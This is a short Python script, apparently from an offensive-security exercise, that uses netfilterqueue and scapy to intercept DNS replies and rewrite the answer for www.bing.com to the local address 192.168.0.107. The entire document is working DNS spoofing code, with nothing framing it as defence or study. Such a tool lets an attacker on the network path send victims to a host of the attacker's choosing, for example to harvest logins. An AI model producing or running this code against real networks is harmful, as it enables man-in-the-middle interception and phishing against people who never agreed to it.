#!/usr/bin/env python3

from netfilterqueue import *
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import IP


def process_func(packets):
    scapy_packets = IP(packets.get_payload())
    if scapy_packets.haslayer(DNSRR):
        qname = scapy_packets[DNSQR].qname
        a = "www.bing.com"
        if b"www.bing.com" in qname:
            print("[+] Spoofing Started")
            ans = DNSRR(rrname=qname, rdata="192.168.0.107")
            scapy_packets[DNS].an = ans
            scapy_packets[DNS].ancount = 1

            del scapy_packets[IP].len
            del scapy_packets[IP].chksum
            del scapy_packets[UDP].len
            del scapy_packets[UDP].chksum

            packets.set_payload(bytes(scapy_packets))
            print(scapy_packets.show())
            print("\n-------------------------------------------------------------------")
    packets.accept()


queue = NetfilterQueue()
queue.bind(121, process_func)
queue.run()
